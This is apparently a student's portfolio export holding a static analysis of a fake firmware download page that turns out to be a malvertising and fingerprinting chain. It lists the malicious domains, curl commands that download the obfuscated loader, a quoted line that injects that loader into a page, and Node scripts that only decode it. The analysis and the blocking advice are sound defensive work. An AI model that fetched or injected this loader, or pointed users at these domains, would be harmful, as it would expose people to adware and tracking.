{"MalvertiseWriteup":{"slug":"MalvertiseWriteup","filePath":"MalvertiseWriteup.md","title":"MalvertiseWriteup","links":[],"tags":[],"content":"Comprehensive technical write-up — investigation of gofirmware.com/downloads/pxie-8880-firmware\nAuthor: Gabriel Adams\nDate: 2025-09-27\nScope: Static analysis of a suspiciouswebsite.\nExecutive summary\nI investigated gofirmware.com/downloads/pxie-8880-firmware and determined it is not a firmware distribution page but a malvertising / adware delivery chain. The page serves an HTML “loading” stub that immediately runs client-side redirect logic and injects an obfuscated external loader (mw.min.js) from hoksomuptak.net. That loader fingerprints the browser (using modern high-entropy APIs), appends that data to redirect/fetch URLs, and contacts multiple obscure domains (zdzhk.com, kbvcd.com, my.rtmark.net, dulotadtor.com, abunownon.com, dawac.com) to pull staged resources (not firmware binaries). Importantly, some routing decisions occur server-side (host identified as ak.inazumarillom.com), so visitors may see different behavior based on platform, IP, referrer, or fingerprint data. The flow is consistent with drive-by malvertising/push-subscription abuse and not legitimate firmware delivery.\nDetailed findings\n1 — What I started with\n\n\nTarget URL: gofirmware.com/downloads/pxie-8880-firmware\n\n\nGoal: Determine what runs when someone clicks the download link and whether it led to malicious behavior.\n\n\n\n2 — Environment and safety posture\n\nI knew there was a possibility of malicious code execution so I did all analysis in a new Ubuntu 25.x.x VM, on a VLAN sectioned off from the rest of my personal network, running an updated browser.\n\n3 — Commands I ran\nI used curl to fetch headers and page content, and to download the external script, then used Node.js scripts for static deobfuscation.\n# Save page source and capture verbose trace (safe; does not execute JS)\ncurl -v -L --max-redirs 20 &quot;gofirmware.com/downloads/pxie-8880-firmware&quot; -o gofirmware_page.html 2&gt; curl_trace.txt\n \n# Inspecting headers quickly\ncurl -I -L &quot;gofirmware.com/downloads/pxie-8880-firmware&quot;\n \n# Downloading the external loader referenced in the page (protocol-relative -&gt; https)\ncurl -sS -o mw.min.js &quot;hoksomuptak.net/0c5/9cac6/mw.min.js\n \n# Inspecting the start of the downloaded loader (safe, static)\nhead -n 200 mw.min.js\n \n# Static decoding \nnode deobfuscate.js\nnode reconstruct_urls.js\n(You can find the Node scripts I used earlier — they parse the mapping object inside mw.min.js, apply the Caesar-style decode seen in the obfuscated code, and produce decoded key/value pairs and reconstructed URLs. Those scripts only decode strings and never eval or run remote fetches.)\n4 — What the initial HTML contained (static observation)\nFrom gofirmware_page.html (loading-page):\n\n\nA meta refresh:\n&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=ak.inazumarillom.com/4/8643286\n→ Redirects client after 5 seconds.\n\n\nAn inline script that:\n\n\nContains obfuscated code that reconstructs a query string using navigator.userAgentData (if present).\n\n\nBuilds a URL and executes window.location.replace(...) with those appended parameters.\n\n\nInjects an external script via:\ns.src=&#039;//hoksomuptak.net/0c5/9cac6/mw.min.js#039; + &#039;&amp;sw=/sw-check-permissions-80925.js&#039;;\ndocument.head.appendChild(s);\n\n\nYandex Metrika analytics snippet (tracking) was present.\n\n\n\n\nInterpretation: the page tries to ensure a redirect occurs (meta refresh + JS). The JS collects browser fingerprint info and loads an external, obfuscated loader. The external loader (mw.min.js) is the real workhorse.\n5 — External loader (mw.min.js) — static analysis &amp; decoding\nI downloaded mw.min.js and performed static decoding of the mapping object found inside the obfuscated code.\nHow the loader was obfuscated\n\n\nThe file contains a big mapping object with strings obfuscated by a simple per-letter rotation (a Caesar-like shift ±12) and dynamic getters.\n\n\nThe loader computes many values via Object.defineProperty getters and only decodes strings on demand.\n\n\nWhat I decoded (representative highlights)\n\n\nDecoded domains referenced by the loader:\n\n\nzdzhk.com\n\n\nkbvcd.com\n\n\nmy.rtmark.net\n\n\ndulotadtor.com\n\n\nabunownon.com\n\n\ndawac.com\n\n\n\n\nDecoded resource paths:\n\n\n/contents/s/a7/7e/0e/.../01027922412471.png\n\n\n/contents/s/a7/7e/0e/.../01027922412470.png\n\n\n/4/ (short directory used in routing)\n\n\n\n\nDecoded behavior keys (indicative strings):\n\nforcePopup, swDefaultBanner, Personal Offer for You., swPingDomain, swRunCmdCache, autoInstall, getOptionsFromUrl\n\n\n\nLoader logic (static reconstruction):\n\n\nThe loader constructs fetch URLs by combining a base domain + path tokens, fetches those resources, creates DOM nodes, sets attributes (CORS, crossorigin, dataset), and injects downloaded content into the page (createElement, appendChild, createTextNode).\n\n\nThe loader has fallback logic: if a fetch fails, it constructs alternative URLs (including a server-side host + path combination) and retries.\n\n\nMany reconstructed URLs point to .png resources; the loader may treat these as images, tracking pixels, decoy content, or containers for encoded payloads.\n\n\n\n\nInterpretation: mw.min.js is a loader that fingerprints the client and pulls staged resources from a set of obscure domains. It injects content into the page, can force popups or banners, and contains service-worker related config keys — all consistent with malvertising/service-worker adware patterns.\n6 — Server-side logic and platform-dependent behavior\n\n\nThe HTML’s meta refresh target was ak.inazumarillom.com/4/8643286\n\n\nThe inline JS also appended fingerprints and used window.location.replace(...) to move the user to a URL that includes those fingerprints.\n\n\nFrom logs, colleagues, and the loader’s fallback logic, I concluded some routing decisions happen on the server side (host: ak.inazumarillom.com). That means:\n\n\nThe server at ak.inazumarillom.com can examine incoming request headers, IP address, referrer, and any fingerprint query parameters and return different content (benign ad, aggressive popup, link to malware) depending on those signals.\n\n\nConsequently, two different visitors (or the same visitor from two different devices) may see different destinations or payloads.\n\n\n\n\nWhy that matters: server-side routing makes detection and reproduction harder — static analysis will only reveal the loader and how it contacts the server; the server can vary behavior and only serve the malicious payload under certain conditions (geo, IP range, referrer, UA, cookie presence, or a fingerprint threshold).\n7 — Fingerprinting details (what the JS collected and how it was used)\nThe loader used the modern browser API navigator.userAgentData and its getHighEntropyValues() call (where available) to get high-entropy fields. Specifically:\n\n\nFields fetched (when supported):\n\n\nmobile (is the device mobile)\n\n\nmodel (device model)\n\n\nplatform (OS family)\n\n\nplatformVersion (OS version)\n\n\nuaFullVersion (browser full version)\n\n\n\n\nHow these values were used:\n\n\nConstructed a query string like ?is_mobile=true&amp;android_model=&lt;encoded&gt;&amp;os=&lt;encoded&gt;&amp;os_version=&lt;encoded&gt;&amp;browser_version=&lt;encoded&gt;\n\n\nAppended to redirect/fetch URLs and sent to the server. That enriched fingerprint allowed the server-side logic to:\n\n\ntarget specific device types (mobile vs desktop),\n\n\nselect specific offers or payloads,\n\n\nevade generic sandboxing by only serving malicious content to specific environments.\n\n\n\n\n\n\nNote on privacy: navigator.userAgentData.getHighEntropyValues() supplies more granular information than the classic navigator.userAgent string; attackers use it to fingerprint more reliably.\n8 — Reconstructed URL patterns and what they imply\n\n\nI reconstructed ~72 URL combinations by combining decoded base domains with the /contents/.../*.png paths and /4/ endpoints. Examples:\n\n\nzdzhk.com/contents/.../01027922412471.png\n\n\nkbvcd.com/4/\n\n\nmy.rtmark.net/contents/.../01027922412470.png\n\n\n\n\nInterpretation of patterns:\n\n\n.png targets often used as tracking pixels or stealth containers for encoded data. Attackers can store JS or data in what looks like image resources and decode them client-side.\n\n\nThe /4/ endpoints look like campaign/redirect endpoints that may return different HTML/JS depending on server-side decision logic.\n\n\nThe presence of multiple domains provides redundancy and evasion — if one domain is blocked, another can be used.\n\n\n9 — Evidence of adware/service-worker strategies\n\n\nMany decoded keys referenced service-worker concepts and persistent banner/popup logic (sw* keys, autoInstall, forcePopup, assign, defaultBannerDomain).\n\n\nThis indicates the loader either:\n\n\nuses service-workers to persist or cache behavior across sessions (service-worker adware), or\n\n\nregisters scripts that make investigation harder (background network calls and event-driven behavior).\n\n\n\n\nTakeaway: even if no binary is installed, the browser environment can be abused to present persistent ads, notifications, or re-run redirect behavior until the service-worker or cached entries are removed.\n10 — Impact assessment (if you clicked the link)\n\n\nIf you only clicked and did not interact further:\n\nMost likely outcomes: your IP, referrer, and detailed browser fingerprint were collected. You may have seen aggressive popups/ads. No evidence from static analysis that simply visiting automatically executed a binary on your OS. That said, there is logic present to analyze what platform you are on, and server logic based on that information. Given that information it is completely possible that if you are on a specific platform that they are wanting to target then you would get a malicious payload automatically downloaded (and ran if they were using a browser exploit). I’m not going to test it on a bunch of different platforms so I’m just giving the general advice to be safe.\n\n\n\nIf you interacted with prompts, accepted notifications, or downloaded and ran a file:\n\nRisk escalates — you may have installed adware, an unwanted extension, or in a worst case, a further payload.\n\n\n\nPotential persistent artifacts in the browser:\n\n\nRegistered service-worker(s).\n\n\nPush notification subscriptions.\n\n\nLocalStorage / IndexedDB entries used by the loader.\n\n\nCached banner assets or scripts.\n\n\n\n\n11 — Recommendations &amp; remediation steps\nImmediate (for users)\n\n\nIf you clicked but didn’t interact further:\n\n\nClear the site data in your browser for gofirmware.com and the domains seen (clear service-workers, site cookies, localStorage, and notifications).\n\n\nSteps (Chrome/Chromium): Settings → Privacy and security → Cookies and other site data → See all site data and permissions → search and remove entries for gofirmware.com, hoksomuptak.net, zdzhk.com, etc. Also check chrome://serviceworker-internals/ or devtools Application → Service Workers.\n\n\n\n\nIf you accepted any prompts or downloaded files:\n\nDo not run downloaded files. Preserve copies and hashes. Investigate inside a VM or submit to VirusTotal / Hybrid Analysis. If you installed something, follow removal steps in a sandbox/VM first; if compromised, disconnect and escalate.\n\n\n\nTechnical / SOC\n\n\nBlock at DNS/firewall:\n\n\nHigh priority: zdzhk.com, kbvcd.com, dulotadtor.com, abunownon.com.\n\n\nMedium: my.rtmark.net, dawac.com.\n\n\nAlso block hoksomuptak.net and ak.inazumarillom.com (loader origin &amp; redirect controller).\n\n\n\n\nPreserve evidence: curl_trace.txt, gofirmware_page.html, mw.min.js, and outputs from the deobfuscation scripts.\n\n\nSearch logs: inspect web/proxy logs for requests to the domains above to identify other internal clients that may have visited these pages.\n\n\nEndpoint checks: look for recent installs, new scheduled tasks, suspicious browser extensions, or service-worker registrations on user browsers.\n\n\nReporting / takedown\n\n\nConsider reporting the malicious domains to:\n\n\nYour internal threat intel/SOC team,\n\n\nDNS/ISP abuse contacts for the domains,\n\n\nPublic services like abuse.ch or the hoster of the domains (from WHOIS/hosting lookup).\n\n\n\n\nSubmit mw.min.js and the reconstructed URLs to VT / Hybrid Analysis for broader telemetry.\n\n\n12 — Appendix A — Key artifacts archived\n\n\ncurl_trace.txt — HTTP headers and redirection trace.\n\n\ngofirmware_page.html (page source).\n\n\nloading-page (local file copy of the HTML).\n\n\nmw.min.js (downloaded loader).\n\n\nNode scripts used: deobfuscate.js, reconstruct_urls.js (safe static decoders).\n\n\nOutputs from Node scripts: the decoded mapping and the reconstructed URL list.\n\n\ndeobfuscate.js:\n// deobfuscate.js\n \n// Static deobfuscator for mw.min.js mapping object\n \n// - Reads mw.min.js, finds Object.entries({...}) block\n \n// - Extracts simple key:&#039;string&#039; and key:number pairs (skips functions/complex values)\n \n \n// - Prints decoded mapping, URL-like values, and tries to reconstruct fetch URL patterns\n \n  \n \nconst fs = require(&#039;fs&#039;);\n \nconst path = require(&#039;path&#039;);\n \n  \n \nconst INFILE = path.join(__dirname, &#039;mw.min.js&#039;);\n \n  \n \nif (!fs.existsSync(INFILE)) {\n \nconsole.error(`ERROR: ${INFILE} not found. Put mw.min.js in same folder as this script.`);\n \nprocess.exit(1);\n \n}\n \n  \n \nconst raw = fs.readFileSync(INFILE, &#039;utf8&#039;);\n \n  \n \n// 1) Locate Object.entries({...}) block\n \nconst startMarker = &#039;Object.entries(&#039;;\n \nlet idx = raw.indexOf(startMarker);\n \nif (idx === -1) {\n \nconsole.error(&#039;ERROR: Could not find &quot;Object.entries(&quot; in mw.min.js&#039;);\n \nprocess.exit(1);\n \n}\n \nidx = raw.indexOf(&#039;{&#039;, idx + startMarker.length);\n \nif (idx === -1) {\n \nconsole.error(&#039;ERROR: Could not find &quot;{&quot; after Object.entries(&#039;);\n \nprocess.exit(1);\n \n}\n \n  \n \n// find matching closing brace for the top-level object (handles nested braces)\n \nlet depth = 0;\n \nlet endIdx = -1;\n \nfor (let i = idx; i &lt; raw.length; i++) {\n \nconst ch = raw[i];\n \nif (ch === &#039;{&#039;) depth++;\n \nelse if (ch === &#039;}&#039;) {\n \ndepth--;\n \nif (depth === 0) {\n \nendIdx = i;\n \nbreak;\n \n}\n \n}\n \n}\n \nif (endIdx === -1) {\n \nconsole.error(&#039;ERROR: Could not find end of mapping object&#039;);\n \nprocess.exit(1);\n \n}\n \n  \n \nconst objText = raw.slice(idx, endIdx + 1);\n \n  \n \n// 2) Extract simple key:&#039;string&#039; and key:&quot;string&quot; and key:number pairs\n \n// We&#039;ll intentionally only capture primitive string/number assignments to avoid running code\n \nconst kvRegexSingle = /(?:([&quot;&#039;]?)([A-Za-z0-9_$]+)\\1)\\s*:\\s*&#039;((?:\\\\&#039;|[^&#039;])*)&#039;/g;\n \nconst kvRegexDouble = /(?:([&quot;&#039;]?)([A-Za-z0-9_$]+)\\1)\\s*:\\s*&quot;((?:\\\\&quot;|[^&quot;])*)&quot;/g;\n \nconst kvRegexNum = /(?:([&quot;&#039;]?)([A-Za-z0-9_$]+)\\1)\\s*:\\s*([0-9]+(?:\\.[0-9]+)?)/g;\n \n  \n \nconst mapping = {};\n \n  \n \n// single-quoted strings\n \nlet m;\n \nwhile ((m = kvRegexSingle.exec(objText)) !== null) {\n \nconst key = m[2];\n \nconst rawVal = m[3].replace(/\\\\&#039;/g, &quot;&#039;&quot;); // unescape simple escaped single quotes\n \nmapping[key] = rawVal;\n \n}\n \n// double-quoted strings\n \nwhile ((m = kvRegexDouble.exec(objText)) !== null) {\n \nconst key = m[2];\n \nconst rawVal = m[3].replace(/\\\\&quot;/g, &#039;&quot;&#039;);\n \nmapping[key] = rawVal;\n \n}\n \n// pretty numbers\n \nwhile ((m = kvRegexNum.exec(objText)) !== null) {\n \nconst key = m[2];\n \nconst rawVal = m[3];\n \nif (!(key in mapping)) mapping[key] = Number(rawVal);\n \n}\n \n  \n \nif (Object.keys(mapping).length === 0) {\n \nconsole.error(&#039;ERROR: No simple key:string/number pairs found. The file format may differ.&#039;);\n \nprocess.exit(1);\n \n}\n \n  \n \n// 3) Caesar-like decode function (mirrors the one in the obfuscated script)\n \n// It rotates letters by -12 (i.e., (c - 65 + 26 - 12) % 26)\n \nfunction decodeCaesar(str) {\n \nif (typeof str !== &#039;string&#039;) return str;\n \nreturn str\n \n.split(&#039;&#039;)\n \n.map((s) =&gt; {\n \nconst c = s.charCodeAt(0);\n \nif (c &gt;= 65 &amp;&amp; c &lt;= 90) return String.fromCharCode(((c - 65 + 26 - 12) % 26) + 65);\n \nif (c &gt;= 97 &amp;&amp; c &lt;= 122) return String.fromCharCode(((c - 97 + 26 - 12) % 26) + 97);\n \nreturn s;\n \n})\n \n.join(&#039;&#039;);\n \n}\n \n  \n \n// 4) Decode values\n \nconst decoded = {};\n \nfor (const k of Object.keys(mapping)) {\n \nconst v = mapping[k];\n \ndecoded[k] = typeof v === &#039;string&#039; ? decodeCaesar(v) : v;\n \n}\n \n  \n \n// 5) Collect URL-like decoded values\n \nconst urlCandidates = [];\n \nfor (const [k, v] of Object.entries(decoded)) {\n \nif (typeof v === &#039;string&#039;) {\n \n// detect proto-like or domain-like strings\n \nif (v.match(/^[a-z][a-z0-9+\\-.]*:\\/\\//i) || v.match(/\\.[a-z]{2,6}(?:[:\\/]|$)/i) || v.match(/\\/[A-Za-z0-9._\\-]{4,}/)) {\n \nurlCandidates.push({ key: k, value: v });\n \n}\n \n}\n \n}\n \n  \n \n// 6) Try reconstructing fetch URL patterns used in the loader\n \n// The loader used something like `${t[x.ar]}${t[x.Xr]}${t[x.Jr]}`\n \n// We&#039;ll try combinations of likely keys\n \nconst combosToTry = [\n \n[&#039;ar&#039;, &#039;Xr&#039;, &#039;Jr&#039;],\n \n[&#039;E&#039;, &#039;i&#039;, &#039;P&#039;],\n \n[&#039;E&#039;, &#039;P&#039;, &#039;f&#039;],\n \n[&#039;E&#039;, &#039;P&#039;, &#039;P&#039;],\n \n[&#039;E&#039;, &#039;i&#039;, &#039;f&#039;],\n \n[&#039;e&#039;, &#039;i&#039;, &#039;P&#039;],\n \n[&#039;ar&#039;, &#039;Xr&#039;, &#039;Eq&#039;], // extra attempts\n \n];\n \n  \n \nconst reconstructed = [];\n \nfor (const combo of combosToTry) {\n \nif (decoded[combo[0]] &amp;&amp; decoded[combo[1]] &amp;&amp; decoded[combo[2]]) {\n \nreconstructed.push({\n \ncombo: combo.join(&#039;+&#039;),\n \nurl: `${decoded[combo[0]]}${decoded[combo[1]]}${decoded[combo[2]]}`,\n \n});\n \n}\n \n}\n \n  \n \n// 7) Also search the whole decoded mapping values for &#039;tffbe&#039; (looks like obf protocol) and convert if found.\n \n// The decodeCaesar should have already turned &#039;tffbe&#039; into something readable by now\n \nconst tffbeHits = [];\n \nfor (const [k, v] of Object.entries(decoded)) {\n \nif (typeof v === &#039;string&#039; &amp;&amp; v.match(/^[a-z]{3,6}:\\/\\//i)) {\n \ntffbeHits.push({ key: k, value: v });\n \n}\n \n}\n \n  \n \n// 8) Print results \n \nconsole.log(&#039;\\n=== Decoded mapping (sample) ===&#039;);\n \nconst allKeys = Object.keys(decoded).sort();\n \nfor (const k of allKeys) {\n \nconsole.log(`${k}: ${decoded[k]}`);\n \n}\n \nconsole.log(`\\n(total decoded keys: ${allKeys.length})`);\n \n  \n \nif (urlCandidates.length) {\n \nconsole.log(&#039;\\n=== URL-like decoded values ===&#039;);\n \nurlCandidates.forEach((u) =&gt; console.log(`${u.key}: ${u.value}`));\n \n} else {\n \nconsole.log(&#039;\\nNo obvious URL-like decoded values found in simple pairs.&#039;);\n \n}\n \n  \n \nif (reconstructed.length) {\n \nconsole.log(&#039;\\n=== Best-effort reconstructed fetch URL(s) ===&#039;);\n \nreconstructed.forEach((r) =&gt; console.log(`${r.combo} -&gt; ${r.url}`));\n \n} else {\n \nconsole.log(&#039;\\nNo fetch URL reconstructed from the tried key combos. You can add more combos in combosToTry.&#039;);\n \n}\n \n  \n \nif (tffbeHits.length) {\n \nconsole.log(&#039;\\n=== Protocol-like hits (decoded) ===&#039;);\n \ntffbeHits.forEach((h) =&gt; console.log(`${h.key}: ${h.value}`));\n \n}\n \n  \n \nconsole.log(&#039;\\n=== Notes ===&#039;);\n \nconsole.log(&#039;- This extractor only captures simple key:string and key:number pairs from the mapping object.&#039;);\n \nconsole.log(&#039;- The original script used getters to decode strings on-demand; this static extractor decodes the raw stored strings.&#039;);\n \nconsole.log(&#039;- Functions, arrays, and computed values inside the mapping are intentionally NOT executed for safety.&#039;);\n \nconsole.log(&#039;\\nDone.&#039;);\nreconstruct_urls.js:\n \n// This thing does pretty muich the same as the other script but just outputs it cleaner because chat is way better at JavaScript then me lol\n \n \n// - Finds decoded base domains (http/https) and decoded path-like values (starting with / or containing &quot;/contents/&quot;)\n \n// - Outputs combinations (domain + path) and other sensible variants\n  \n \nconst fs = require(&#039;fs&#039;);\n \nconst path = require(&#039;path&#039;);\n \n  \n \nconst INFILE = path.join(__dirname, &#039;mw.min.js&#039;);\n \nif (!fs.existsSync(INFILE)) {\n \nconsole.error(&#039;ERROR: mw.min.js not found in current directory.&#039;);\n \nprocess.exit(1);\n \n}\n \n  \n \nconst raw = fs.readFileSync(INFILE, &#039;utf8&#039;);\n \n  \n \n// locate Object.entries({...}) block as before\n \nconst startMarker = &#039;Object.entries(&#039;;\n \nlet idx = raw.indexOf(startMarker);\n \nif (idx === -1) {\n \nconsole.error(&#039;ERROR: Could not find &quot;Object.entries(&quot; in mw.min.js&#039;);\n \nprocess.exit(1);\n \n}\n \nidx = raw.indexOf(&#039;{&#039;, idx + startMarker.length);\n \nif (idx === -1) {\n \nconsole.error(&#039;ERROR: Could not find opening &quot;{&quot; after Object.entries(&#039;);\n \nprocess.exit(1);\n \n}\n \nlet depth = 0;\n \nlet endIdx = -1;\n \nfor (let i = idx; i &lt; raw.length; i++) {\n \nconst ch = raw[i];\n \nif (ch === &#039;{&#039;) depth++;\n \nelse if (ch === &#039;}&#039;) {\n \ndepth--;\n \nif (depth === 0) { endIdx = i; break; }\n \n}\n \n}\n \nif (endIdx === -1) {\n \nconsole.error(&#039;ERROR: Could not locate end of the mapping object.&#039;);\n \nprocess.exit(1);\n \n}\n \nconst objText = raw.slice(idx, endIdx + 1);\n \n  \n \n// regexes for primitive key: &#039;string&#039; and &quot;string&quot; and numbers\n \nconst kvRegexSingle = /(?:([&quot;&#039;]?)([A-Za-z0-9_$]+)\\1)\\s*:\\s*&#039;((?:\\\\&#039;|[^&#039;])*)&#039;/g;\n \nconst kvRegexDouble = /(?:([&quot;&#039;]?)([A-Za-z0-9_$]+)\\1)\\s*:\\s*&quot;((?:\\\\&quot;|[^&quot;])*)&quot;/g;\n \nconst kvRegexNum = /(?:([&quot;&#039;]?)([A-Za-z0-9_$]+)\\1)\\s*:\\s*([0-9]+(?:\\.[0-9]+)?)/g;\n \n  \n \nconst mapping = {};\n \n  \n \n// extract single-quoted strings\n \nlet m;\n \nwhile ((m = kvRegexSingle.exec(objText)) !== null) {\n \nconst key = m[2];\n \nconst rawVal = m[3].replace(/\\\\&#039;/g, &quot;&#039;&quot;);\n \nmapping[key] = rawVal;\n \n}\n \n// double-quoted\n \nwhile ((m = kvRegexDouble.exec(objText)) !== null) {\n \nconst key = m[2];\n \nconst rawVal = m[3].replace(/\\\\&quot;/g, &#039;&quot;&#039;);\n \nmapping[key] = rawVal;\n \n}\n \n// numbers\n \nwhile ((m = kvRegexNum.exec(objText)) !== null) {\n \nconst key = m[2];\n \nconst rawVal = m[3];\n \nif (!(key in mapping)) mapping[key] = Number(rawVal);\n \n}\n \n  \n \nif (Object.keys(mapping).length === 0) {\n \nconsole.error(&#039;ERROR: No simple key:string/number pairs found. The file may be in a different format.&#039;);\n \nprocess.exit(1);\n \n}\n \n  \n \n// Caesar-like decode function (same shift seen in the original)\n \nfunction decodeCaesar(str) {\n \nif (typeof str !== &#039;string&#039;) return str;\n \nreturn str\n \n.split(&#039;&#039;)\n \n.map((s) =&gt; {\n \nconst c = s.charCodeAt(0);\n \nif (c &gt;= 65 &amp;&amp; c &lt;= 90) return String.fromCharCode(((c - 65 + 26 - 12) % 26) + 65);\n \nif (c &gt;= 97 &amp;&amp; c &lt;= 122) return String.fromCharCode(((c - 97 + 26 - 12) % 26) + 97);\n \nreturn s;\n \n})\n \n.join(&#039;&#039;);\n \n}\n \n  \n \n// decode mapping\n \nconst decoded = {};\n \nfor (const k of Object.keys(mapping)) {\n \nconst v = mapping[k];\n \ndecoded[k] = (typeof v === &#039;string&#039;) ? decodeCaesar(v) : v;\n \n}\n \n  \n \n// collect domains and path-like strings\n \nconst domains = [];\n \nconst paths = [];\n \nfor (const [k, v] of Object.entries(decoded)) {\n \nif (typeof v !== &#039;string&#039;) continue;\n \n// domain-like: begins with http/https\n \nif (v.match(/^[a-z][a-z0-9+\\-.]*:\\/\\//i)) {\n \ndomains.push({ key: k, value: v });\n \n}\n \n// path-like: begins with / or contains /contents/\n \nif (v.startsWith(&#039;/&#039;) || v.includes(&#039;/contents/&#039;) || v.match(/\\/[A-Za-z0-9._\\-]{4,}/)) {\n \n// skip domains that are mistakenly captured as paths\n \nif (!v.match(/^[a-z][a-z0-9+\\-.]*:\\/\\//i)) {\n \npaths.push({ key: k, value: v });\n \n}\n \n}\n \n}\n \n  \n \n// Deduplicate helpers\n \nconst uniq = (arr, accessor = x =&gt; x) =&gt; {\n \nconst seen = new Set();\n \nconst out = [];\n \nfor (const it of arr) {\n \nconst id = accessor(it);\n \nif (!seen.has(id)) { seen.add(id); out.push(it); }\n \n}\n \nreturn out;\n \n};\n \n  \n \nconst uniqDomains = uniq(domains, d =&gt; d.value);\n \nconst uniqPaths = uniq(paths, p =&gt; p.value);\n \n  \n \n// Build combinations\n \nconst combos = [];\n \nfor (const d of uniqDomains) {\n \nfor (const p of uniqPaths) {\n \n// clean concatenation: ensure single slash\n \nlet full1 = d.value.endsWith(&#039;/&#039;) ? d.value.slice(0, -1) + p.value : d.value + p.value;\n \n// Some code patterns omitted the protocol and/or trailing pieces; also create variant without protocol\n \ncombos.push({\n \ndomainKey: d.key,\n \npathKey: p.key,\n \nurl: full1\n \n});\n \n  \n \n// variant: if domain had no trailing slash but path doesn&#039;t start with slash (rare), also generate with slash\n \nif (!p.value.startsWith(&#039;/&#039;)) {\n \ncombos.push({\n \ndomainKey: d.key,\n \npathKey: p.key,\n \nurl: d.value + &#039;/&#039; + p.value\n \n});\n \n}\n \n  \n \n// plain join with double path (some reconstructions in your earlier output showed domain + P + &#039;/&#039; + f)\n \n// create combos of two paths joined\n \nfor (const p2 of uniqPaths) {\n \ncombos.push({\n \ndomainKey: d.key,\n \npathKey: `${p.key}+${p2.key}`,\n \nurl: full1 + (p2.value.startsWith(&#039;/&#039;) ? p2.value : &#039;/&#039; + p2.value)\n \n});\n \n}\n \n}\n \n}\n \n  \n \n// Also include domain-only entries and path-only entries for inspection\n \nconst domainOnly = uniqDomains.map(d =&gt; ({ key: d.key, value: d.value }));\n \nconst pathOnly = uniqPaths.map(p =&gt; ({ key: p.key, value: p.value }));\n \n  \n \n// Print results\n \nconsole.log(&#039;\\n=== Decoded domains ===&#039;);\n \ndomainOnly.forEach(d =&gt; console.log(`${d.key}: ${d.value}`));\n \n  \n \nconsole.log(&#039;\\n=== Decoded paths / resources ===&#039;);\n \npathOnly.forEach(p =&gt; console.log(`${p.key}: ${p.value}`));\n \n  \n \nconsole.log(`\\n=== Reconstructed URL combinations (best-effort) - ${combos.length} items (showing up to 200) ===`);\n \ncombos.slice(0, 200).forEach(c =&gt; console.log(`${c.domainKey}+${c.pathKey} -&gt; ${c.url}`));\n \n  \n \nif (combos.length &gt; 200) {\n \nconsole.log(`\\n(... ${combos.length - 200} more combinations not printed)`);\n \n}\n \n  \n \nprocess.exit(0);\n \n13 — Appendix B — Short glossary / what things mean\n\n\nMeta refresh: client-side HTML redirect via meta tag.\n\n\nnavigator.userAgentData.getHighEntropyValues: modern API to get detailed browser/OS/device info.\n\n\nService-worker (sw): browser background worker that can persist behavior and run when the site is not loaded. Abused by adware for persistence.\n\n\nMalvertising: malicious advertising that either redirects users to scams or delivers payloads via ad networks.\n\n\nDrive-by: a web visit that causes malicious behavior without explicit user intent to download malware.\n\n\n14 — Final conclusion\nThe gofirmware.com “firmware” download link is a façade. The real activity is a malvertising/adware pipeline that fingerprints visitors, consults server-side routing logic (so victims see conditional behavior), and pulls staged resources from a network of obscure domains. No legitimate firmware was found. Treat the link and associated domains as malicious, block them, and analyze any dynamic behavior only in a controlled sandbox/VM."},"index":{"slug":"index","filePath":"index.md","title":"Gabriel Adams – Professional Portfolio","links":["files/Adams_Gabriel_Resume.pdf","files/CompTIA_Security+_ce_certificate.pdf","files/CompTIA_CySA+_ce_certificate.pdf","files/GHomeSmartPlugWriteup.pdf","files/MalvertizerWriteup.pdf","mailto:gradams42@tntech.edu"],"tags":[],"content":"👋 About Me\nI’m a cybersecurity researcher with a focus on embedded systems, hardware security, and satellite communication protocols. My experience includes:\n\nFormer Embedded Systems Security Analyst at CESR Labs\nPrevious IT Security Intern at Rebo Electronics\nOngoing Satellite Security Researcher at CEROC\nCurrent Vulnerability Research Intern at Oak Ridge National Laboratory\n\nI hold CompTIA Security+ and CompTIA CySA+ certifications and am proud to be a Scholarship for Service (SFS) Scholar.\nMy academic timeline includes:\n\nB.S. Computer Engineering (expected December 2025)\nM.S. Cybersecurity (expected December 2026)\n\nOutside of work, I enjoy exploring hardware security challenges and pushing the boundaries of satellite system protection within academia.\n\n📄 Resume\n\nDownload Resume\n\n\n🎓 Certifications\n\nCompTIA Security+\nCompTIA CySA+\n\n\n🛠 Project Writeups\n\nGHome Smart Plug\nMalvertizer Writeup\n\n\n📬 Contact\n\nEmail: gradams42@tntech.edu\nGitHub: github.com/gradams42\nLinkedIn: linkedin.com/in/gabriel-adams-749815260\n"}}